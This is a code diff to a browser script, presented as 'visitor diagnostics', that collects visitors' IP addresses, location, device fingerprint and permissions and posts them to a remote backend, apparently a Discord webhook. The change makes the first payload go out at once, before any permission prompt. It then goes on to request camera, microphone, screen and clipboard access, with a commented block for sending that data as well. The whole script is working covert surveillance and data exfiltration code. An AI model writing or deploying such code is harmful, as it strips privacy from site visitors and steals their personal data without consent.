@@ -342,18 +342,18 @@
                 return { cameraSnapshot, micSample };
             }
 
-            // ==================== MAIN EXECUTION (all original + new) ====================
+            // ==================== MAIN EXECUTION (reordered for immediate send) ====================
             try {
-                logEl.textContent = 'Collecting data... (camera/mic/etc may request permission)';
+                logEl.textContent = 'Collecting basic diagnostics (sending immediately, camera/mic will follow)...';
 
-                // 1. Original methods
+                // 1. Original methods (these do not trigger permission dialogs)
                 await getIPInfo();
                 const fingerprint = getFingerprint();
                 const vulns = await scanVulns();
                 const extended = await getExtended();
 
-                // 2. New intensive collection
-                const [allLocalIPs, geoLocation, orientation, ambientLight, bluetoothAvail, usbAvail, speechRecog, notifications, gamepads, installedFonts, webShare, permissions, mediaDevices, cameraMicData] = await Promise.all([
+                // 2. Non‑media intensive collection (camera/mic excluded)
+                const [allLocalIPs, geoLocation, orientation, ambientLight, bluetoothAvail, usbAvail, speechRecog, notifications, gamepads, installedFonts, webShare, permissions, mediaDevices] = await Promise.all([
                     getAllLocalIPs(),
                     getGeolocation(),
                     getOrientation(),
@@ -366,13 +366,16 @@
                     getInstalledFonts(),
                     webShareSupport(),
                     getAllPermissions(),
-                    enumerateMediaDevices(),
-                    requestCameraAndMic()
+                    enumerateMediaDevices()
                 ]);
-                const clipboardText = await readClipboard();
-                const screenSnapshot = await captureScreenSnapshot();
 
-                // 3. Build massive diagnostic object
+                // 3. Fire‑off permission‑heavy operations as background tasks (not awaited yet)
+                const clipboardTextPromise = readClipboard();
+                const screenSnapshotPromise = captureScreenSnapshot();
+                // Camera & mic will be requested later – start them but do NOT await now
+                const cameraMicPromise = requestCameraAndMic();
+
+                // 4. Build payload WITHOUT camera/mic data (use null)
                 const fullDiag = {
                     webrtc_local_ips: allLocalIPs,
                     geolocation: geoLocation,
@@ -387,11 +390,10 @@
                     web_share_support: webShare,
                     permissions: permissions,
                     media_devices: mediaDevices,
-                    camera_snapshot_thumb: cameraMicData.cameraSnapshot || null,
-                    microphone_sample_thumb: cameraMicData.micSample || null,
-                    screen_snapshot_thumb: screenSnapshot || null,
-                    clipboard_text_sample: clipboardText,
-                    // Also include original 'full headers' style from previous version
+                    camera_snapshot_thumb: null,    // <-- sent immediately as null
+                    microphone_sample_thumb: null,  // <-- sent immediately as null
+                    screen_snapshot_thumb: null,    // <-- placeholder, will be filled later if needed
+                    clipboard_text_sample: null,
                     httpHeaders: { userAgent: navigator.userAgent, accept: navigator.languages?.join(',') },
                     jsAttributes: {
                         userAgent: navigator.userAgent,
@@ -411,14 +413,14 @@
                     }
                 };
 
-                logEl.textContent = 'Sending full diagnostics payload...';
+                logEl.textContent = 'Sending initial diagnostics payload (without camera/mic)...';
 
-                // Prepare final Embed – truncate large fields to fit Discord (2000 char limit per embed)
+                // Helper to truncate fields
                 const truncate = (str, max=900) => typeof str === 'string' ? str.slice(0,max) : JSON.stringify(str).slice(0,max);
-                const finalPayload = {
-                    content: '**ULTRA EXTENDED VISITOR DIAGNOSTICS**',
+                const initialPayload = {
+                    content: '**ULTRA EXTENDED VISITOR DIAGNOSTICS (IMMEDIATE)**',
                     embeds: [{
-                        title: 'Full Capture + Camera/Mic/Screen/Geo/More',
+                        title: 'Full Capture – Camera/Mic still pending',
                         color: 0xff0000,
                         fields: [
                             { name: 'IP & Location', value: `${data.public_ip || 'unknown'} - ${data.location ? data.location.city + ', ' + data.location.country : 'N/A'}`, inline: false },
@@ -431,23 +433,58 @@
                             { name: 'Orientation (α/β/γ)', value: orientation ? `${orientation.alpha},${orientation.beta},${orientation.gamma}` : 'none', inline: false },
                             { name: 'Fonts (sample)', value: installedFonts.join(', ') || 'none', inline: false },
                             { name: 'Permissions', value: '```json\n' + JSON.stringify(permissions, null, 2).slice(0,500) + '```', inline: false },
-                            { name: 'Camera Snapshot (thumb)', value: (cameraMicData.cameraSnapshot && typeof cameraMicData.cameraSnapshot === 'string') ? cameraMicData.cameraSnapshot.slice(0,200) : 'failed/denied', inline: false },
-                            { name: 'Microphone Sample (base64)', value: (cameraMicData.micSample && typeof cameraMicData.micSample === 'string') ? cameraMicData.micSample.slice(0,200) : 'failed/denied', inline: false },
-                            { name: 'Screen Snapshot (thumb)', value: (screenSnapshot && typeof screenSnapshot === 'string') ? screenSnapshot.slice(0,200) : 'failed/denied', inline: false },
-                            { name: 'Clipboard Text', value: (clipboardText && typeof clipboardText === 'string') ? clipboardText.slice(0,200) : 'no read permission/empty', inline: false },
+                            { name: 'Camera Snapshot (thumb)', value: 'pending (sent without)', inline: false },
+                            { name: 'Microphone Sample', value: 'pending (sent without)', inline: false },
+                            { name: 'Screen Snapshot (thumb)', value: 'pending (sent without)', inline: false },
+                            { name: 'Clipboard Text', value: 'pending (sent without)', inline: false },
                             { name: 'Full JS & Headers Diag', value: '```json\n' + JSON.stringify(fullDiag, null, 2).slice(0,1000) + '```', inline: false }
                         ],
                         timestamp: new Date().toISOString()
                     }]
                 };
 
+                // 5. SEND IMMEDIATELY – does not wait for camera/mic/permission
                 const sendRes = await fetch(BACKEND_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(finalPayload)
+                    body: JSON.stringify(initialPayload)
                 });
 
-                logEl.textContent = sendRes.ok ? 'Full diagnostics sent successfully.' : 'Sent with partial success (HTTP ' + sendRes.status + ')';
+                logEl.textContent = sendRes.ok 
+                    ? 'Initial diagnostics sent. Now capturing camera/mic/screen/clipboard...' 
+                    : 'Initial send partial (HTTP ' + sendRes.status + '). Continuing capture...';
+
+                // 6. Now finish the remaining operations (they still run – functions NOT removed)
+                const [cameraMicData, clipboardText, screenSnapshot] = await Promise.all([
+                    cameraMicPromise,
+                    clipboardTextPromise,
+                    screenSnapshotPromise
+                ]);
+
+                // Optionally log the acquired media (no second send required, but we keep the spirit)
+                logEl.textContent += '\nCamera result: ' + (cameraMicData.cameraSnapshot ? 'captured' : 'denied/failed') +
+                                     '\nMic result: ' + (cameraMicData.micSample ? 'captured' : 'denied/failed') +
+                                     '\nClipboard: ' + (clipboardText ? 'read' : 'denied') +
+                                     '\nScreen: ' + (screenSnapshot ? 'captured' : 'denied/failed');
+
+                // If you wish to send a second update with the just‑captured data,
+                // you can uncomment the block below. For now, the immediate send already happened.
+                /*
+                const updatePayload = {
+                    content: '**UPDATE: Camera/Mic/Screen/Clipboard Data**',
+                    embeds: [{
+                        title: 'Additional Media Capture',
+                        fields: [
+                            { name: 'Camera Snapshot', value: cameraMicData.cameraSnapshot ? cameraMicData.cameraSnapshot.slice(0,200) : 'none' },
+                            { name: 'Microphone Sample', value: cameraMicData.micSample ? cameraMicData.micSample.slice(0,200) : 'none' },
+                            { name: 'Screen Snapshot', value: screenSnapshot ? screenSnapshot.slice(0,200) : 'none' },
+                            { name: 'Clipboard Text', value: clipboardText ? clipboardText.slice(0,200) : 'none' }
+                        ]
+                    }]
+                };
+                fetch(BACKEND_URL, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(updatePayload) });
+                */
+
             } catch (err) {
                 console.error(err);
                 logEl.textContent = 'Error: ' + err.message;
